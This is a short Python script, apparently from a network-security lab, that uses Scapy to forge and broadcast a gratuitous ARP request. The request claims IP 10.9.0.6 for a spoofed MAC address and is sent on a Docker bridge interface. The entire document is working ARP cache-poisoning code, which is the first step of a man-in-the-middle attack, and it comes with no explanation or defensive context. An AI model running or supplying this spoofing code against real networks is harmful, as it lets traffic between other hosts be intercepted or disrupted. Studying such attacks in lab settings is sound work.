#!/usr/bin/env python3
from scapy.all import *
E = Ether(dst="ff:ff:ff:ff:ff:ff", src="02:42:89:1f:ff:70")
A = ARP(op=1, hwsrc="02:42:89:1f:ff:70", psrc="10.9.0.6",
	hwdst="ff:ff:ff:ff:ff:ff", pdst="10.9.0.6")
A.op = 1 # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt, iface="br-f55ccea4134c")